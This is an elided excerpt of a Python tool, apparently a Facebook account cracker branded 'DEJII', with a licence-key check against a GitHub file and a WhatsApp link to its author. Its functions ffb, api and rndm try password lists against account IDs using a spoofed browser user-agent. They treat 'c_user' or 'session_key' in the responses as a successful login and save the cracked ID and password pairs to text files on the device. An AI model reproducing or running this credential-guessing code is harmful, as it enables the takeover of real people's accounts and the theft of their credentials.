        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open http://wa.me/+2348100939586?text=ABUBAKARSir{wx}');menu()
                        elif xd in ['7','07']:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [DEJII-OK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
                        ...
                        if "c_user" in SILENT:
                                ...
                                print('\r\r\033[1;32m [DEJII-OK] %s | %s'%(ids,pas))
                                open('/sdcard/DEJII-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SILENT:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [DEJII-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/DEJII-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [DEJII-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/DEJII-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/DEJII-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [DEJII-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/DEJII-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [DEJII-OK] '+uid+' | '+pas+'\033[1;97m')
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  with urlopen("https://github.com/dejii300/bomb/blob/main/Access.txt") as response:
    body = response.read()
    os.system(" clear")
  try:
    if id in str(body):
